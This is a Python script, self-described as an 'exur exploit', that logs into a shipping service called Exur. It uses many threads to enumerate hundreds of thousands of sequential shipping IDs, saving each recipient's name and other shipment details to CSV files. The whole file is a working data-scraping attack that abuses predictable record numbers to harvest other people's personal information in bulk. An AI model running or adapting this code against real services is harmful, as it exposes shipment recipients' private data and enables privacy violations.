from dotenv import load_dotenv
load_dotenv()

import threading, os
from time import sleep
from exur import Exur

# Login credentials
USERNAME = os.environ.get("EXUR_USERNAME")
PASSWORD = os.environ.get("EXUR_PASSWORD")

# Shipping
START = int(os.environ.get("EXUR_SHIPPING_START")) # 1024597
END = int(os.environ.get("EXUR_SHIPPING_END")) # 1484206

# General stuff
CSV_FILE = os.environ.get("EXUR_CSV_FILE")
SEPARATOR = os.environ.get("EXUR_CSV_SEPARATOR")
ENCODING = os.environ.get("EXUR_ENCODING")

# Number of threads to use
THREADS = int(os.environ.get("EXUR_THREADS"))

def save_shippings_thread(file_number, start, end, simulate=False):
    '''Retrieve a range a shippings and store them
    in a csv file
    '''

    # New exur session instance
    exur_client = Exur(USERNAME, PASSWORD)

    if exur_client.log_in():
        print(f"thread {file_number}: started. start = {start}; end = {end}")

        if not simulate:
            with open(CSV_FILE % file_number, 'a+', encoding=ENCODING) as f:
                for number in range(start, end + 1):
                    shipping_data = exur_client.get_shipping(number)

                    # "recipient_name" should always be here
                    # otherwise it's an invalid shipping
                    if (shipping_data.get("recipient_name", '') != ''):
                        print(f"thread {file_number}: got {number}")
                        line = f"\"{number}\""
                        for name in Exur.SHIPPING_PARAMS:
                            line += f"{SEPARATOR}\"{shipping_data.get(name[1], '')}\""
                        # Additional fields
                        line += f"{SEPARATOR}\"{shipping_data.get(Exur.SHIPPING_STATUS_FIELD, '')}\""
                        line += f"{SEPARATOR}\"{shipping_data.get(Exur.FINAL_CLIENT_FIELD, '')}\""
                        f.write(line + "\n")
        print(f"thread {file_number}: done!")
    else:
        raise Exception("Couldn't log-in")

def main():
    '''Main'''
    threads = []

    inc = round((END - START) / THREADS)
    print("exur exploit started")
    print(f"threads = {THREADS}; requests per thread = {inc}")
    print()

    override_start = {
        0: 1113467,
        1: 1228724,
        2: 1340954,
        3: 1461307,
    }

    # Create and run all threads
    for i in range(THREADS):
        start = override_start[i] if i in override_start else START + (inc * i)
        end = START + (inc * (i + 1)) - 1
        thread = threading.Thread(target=save_shippings_thread, args=(i, start, end, True))
        # thread = threading.Thread(target=save_shippings_thread, args=(i, start, end))
        thread.daemon = True
        thread.start()
        threads.append(thread)

    # Wait for all threads to finish
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()